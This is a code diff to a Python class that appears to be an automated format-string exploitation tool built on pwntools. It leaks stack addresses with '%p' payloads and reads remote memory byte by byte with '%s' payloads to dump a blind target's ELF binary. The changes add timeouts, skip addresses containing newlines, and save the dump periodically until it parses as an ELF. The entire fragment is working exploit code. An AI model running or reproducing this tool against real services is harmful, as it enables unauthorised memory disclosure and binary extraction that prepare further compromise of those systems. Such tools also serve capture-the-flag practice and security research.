@@ -337,7 +337,7 @@ class ffstr():
 				# Leak an hexadecimal value
 				leak = None
 				while leak is None:
-					data = self.asyncExchange(self.stackPayload(i+1,"p")) #
+					data = self.asyncExchange(self.stackPayload(i+1,"p"),t_out=0.05) #
 					regex = re.search(self.re_HexaPattern, data)
 					if regex:
 						leak = int(regex[0],16)
@@ -354,7 +354,7 @@ class ffstr():
 				# Get Data
 				data = b""
 				while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
-					data = self.asyncExchange(pl)
+					data = self.asyncExchange(pl,t_out=0.05)
 
 				# ELF Header
 				if data.find(b"\x7fELF") > -1:
@@ -380,12 +380,14 @@ class ffstr():
 		if self.elf is not None:
 			log.info("No need to dump the binary ...")
 			return
+		# Unique name for the dump binary
+		self.dump_name = str(int(time()))
 		
 		# Byte per Byte
 		n = 0
-		while n < 16*10:
-			
-			
+		pwntool_not_happy = True
+		while pwntool_not_happy:
+				
 			# Get location
 			i , offset = self.start
 			
@@ -396,7 +398,7 @@ class ffstr():
 				regex = re.search(self.re_HexaPattern, data)
 				if regex:
 					leak = int(regex[0],16)
-			log.info("Leak "+hex(leak)+" ... Offset "+hex(offset))
+			#log.info("Leak "+hex(leak)+" ... Offset "+hex(offset))
 					
 			# Set payload
 			if self.bits == 32:
@@ -405,7 +407,13 @@ class ffstr():
 			else:
 				pos_arg = self.stack_arg+1+2
 				pl = self.stackPayload(pos_arg,"s",size=8+8*2,left="    d34d",right="b33f    ")+p64(leak - offset + n)
-					
+			
+			# test is \n is present in generated payload
+			if pl.find(b"\n")>-1:
+				binary += b"\x00"
+				n+=1
+				continue
+				
 			# Get Data
 			data = b""
 			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
@@ -425,18 +433,26 @@ class ffstr():
 				else:
 					binary += b"\x00"
 					n += 1
-					
-				print(dump)
-				print(hexdump(binary))
 				
 			# Close connexion
 			if not all(self.blind_behavior):
 				self.close()
 
-		# unique name for the dump binary
-		self.dump_name = str(int(time()))
-		with open(self.dump_name,"wb") as fp:
-			fp.write(binary)
+			# dump regularly ~ 160 bytes
+			if len(binary) % 160 ==0:
+			
+				# show dump
+				print(hexdump(binary[-160:]))
+				
+				# dump to file
+				with open(self.dump_name,"wb") as fp:
+					fp.write(binary)
+				# assess pwntools happiness
+				try:
+					self.elf=ELF(self.dump_name)
+					pwntool_not_happy = False
+				except:
+					self.elf = None
 			
 	def loadELF(self):
 		# Load ELF as per pwntools methodology from dumped binary
@@ -481,7 +497,7 @@ class ffstr():
 				pos_arg = self.stack_arg+1+2
 				pl = self.stackPayload(pos_arg,"s",size=8+8*2,left="    d34d",right="b33f    ")+p64(leak - offset + addr)
 					
-			# test is \n is present
+			# test is \n is present in generated payload
 			if pl.find(b"\n")>-1:
 				continue
 				
